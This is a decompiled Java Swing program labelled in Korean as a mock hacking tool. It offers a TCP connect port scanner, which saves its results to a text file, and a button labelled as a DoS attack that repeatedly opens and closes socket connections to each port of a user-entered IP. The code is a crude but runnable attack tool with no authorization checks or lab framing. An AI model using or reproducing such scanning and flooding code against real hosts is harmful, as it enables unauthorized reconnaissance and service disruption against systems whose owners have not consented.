//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

    import java.awt.BorderLayout;
    import java.awt.FlowLayout;
    import java.awt.event.ActionEvent;
    import java.awt.event.ActionListener;
    import java.io.FileWriter;
    import java.io.IOException;
    import java.net.Socket;
    import java.util.List;
    import javax.swing.JButton;
    import javax.swing.JFrame;
    import javax.swing.JLabel;
    import javax.swing.JOptionPane;
    import javax.swing.JPanel;
    import javax.swing.JScrollPane;
    import javax.swing.JTextArea;
    import javax.swing.JTextField;
    import javax.swing.SwingUtilities;
    import javax.swing.SwingWorker;

    public class HackingToolFrame extends JFrame {
    private JTextField inputTextField;
    private JTextField portRangeStartField;
    private JTextField portRangeEndField;
    private JTextArea outputArea;
    private JButton attackButton;
    private JButton dosButton;

    public HackingToolFrame() {
        this.setTitle("모의 해킹툴");
        this.setSize(700, 500);
        this.setDefaultCloseOperation(3);
        this.setLayout(new BorderLayout());
        JPanel topPanel = new JPanel();
        topPanel.setLayout(new FlowLayout());
        JLabel targetLabel = new JLabel("대상 IP");
        this.inputTextField = new JTextField(15);
        JLabel startPortLabel = new JLabel("포트 시작");
        this.portRangeStartField = new JTextField(5);
        JLabel endPortLabel = new JLabel("포트 끝");
        this.portRangeEndField = new JTextField(5);
        this.attackButton = new JButton("포트 스캔 시작");
        this.dosButton = new JButton("DoS 공격 시작");
        topPanel.add(targetLabel);
        topPanel.add(this.inputTextField);
        topPanel.add(startPortLabel);
        topPanel.add(this.portRangeStartField);
        topPanel.add(endPortLabel);
        topPanel.add(this.portRangeEndField);
        topPanel.add(this.attackButton);
        topPanel.add(this.dosButton);
        this.add(topPanel, "North");
        this.outputArea = new JTextArea();
        this.outputArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(this.outputArea);
        this.add(scrollPane, "Center");
        this.attackButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                HackingToolFrame.this.startPortScan();
            }
        });
        this.dosButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                HackingToolFrame.this.startDosAttack();
            }
        });
    }

    private void startPortScan() {
        final String target = this.inputTextField.getText();
        String startPortStr = this.portRangeStartField.getText();
        String endPortStr = this.portRangeEndField.getText();
        if (!target.isEmpty() && !startPortStr.isEmpty() && !endPortStr.isEmpty()) {
            final int startPort;
            final int endPort;
            try {
                startPort = Integer.parseInt(startPortStr);
                endPort = Integer.parseInt(endPortStr);
                if (startPort < 0 || endPort > 65535 || startPort > endPort) {
                    throw new NumberFormatException("포트 번호가 유효하지 않습니다.");
                }
            } catch (NumberFormatException var7) {
                JOptionPane.showMessageDialog(this, "올바른 포트 번호를 입력해주세요.");
                return;
            }

            this.outputArea.setText("");
            this.outputArea.append("포트 스캔 시작: " + target + "\n");
            (new SwingWorker<Void, String>() {
                protected Void doInBackground() throws Exception {
                    for(int port = startPort; port <= endPort; ++port) {
                        try {
                            this.publish(new String[]{"포트 " + port + " 스캔 중..."});
                            Socket socket = new Socket(target, port);
                            socket.close();
                            this.publish(new String[]{"포트 " + port + " ※열림※"});
                        } catch (Exception var3) {
                            this.publish(new String[]{"포트 " + port + " 닫힘"});
                        }

                        Thread.sleep(200L);
                    }

                    return null;
                }

                protected void process(List<String> chunks) {
                    for(String chunk : chunks) {
                        HackingToolFrame.this.outputArea.append(chunk + "\n");
                    }

                }

                protected void done() {
                    HackingToolFrame.this.outputArea.append("포트 스캔 완료!\n");

                    try (FileWriter writer = new FileWriter("port_scan_results.txt")) {
                        writer.write(HackingToolFrame.this.outputArea.getText());
                    } catch (IOException var6) {
                        JOptionPane.showMessageDialog(HackingToolFrame.this, "파일 저장 중 오류 발생.");
                    }

                }
            }).execute();
        } else {
            JOptionPane.showMessageDialog(this, "모든 필드를 입력해주세요.");
        }
    }

    private void startDosAttack() {
        final String target = this.inputTextField.getText();
        String startPortStr = this.portRangeStartField.getText();
        String endPortStr = this.portRangeEndField.getText();
        if (!target.isEmpty() && !startPortStr.isEmpty() && !endPortStr.isEmpty()) {
            final int startPort;
            final int endPort;
            try {
                startPort = Integer.parseInt(startPortStr);
                endPort = Integer.parseInt(endPortStr);
                if (startPort < 0 || endPort > 65535 || startPort > endPort) {
                    throw new NumberFormatException("포트 번호가 유효하지 않습니다.");
                }
            } catch (NumberFormatException var7) {
                JOptionPane.showMessageDialog(this, "올바른 포트 번호를 입력해주세요.");
                return;
            }

            this.outputArea.setText("");
            this.outputArea.append("DoS 공격 시작: " + target + "\n");
            (new SwingWorker<Void, String>() {
                protected Void doInBackground() throws Exception {
                    for(int port = startPort; port <= endPort; ++port) {
                        try {
                            while(true) {
                                this.publish(new String[]{"포트 " + port + "에 연결 시도 중..."});
                                Socket socket = new Socket(target, port);
                                socket.close();
                                Thread.sleep(200L);
                            }
                        } catch (IOException var3) {
                            this.publish(new String[]{"포트 " + port + "에 대한 DoS 공격 실패"});
                        }
                    }

                    return null;
                }

                protected void process(List<String> chunks) {
                    for(String chunk : chunks) {
                        HackingToolFrame.this.outputArea.append(chunk + "\n");
                    }

                }

                protected void done() {
                    HackingToolFrame.this.outputArea.append("DoS 공격 완료!\n");
                }
            }).execute();
        } else {
            JOptionPane.showMessageDialog(this, "모든 필드를 입력해주세요.");
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> (new HackingToolFrame()).setVisible(true));
    }
}
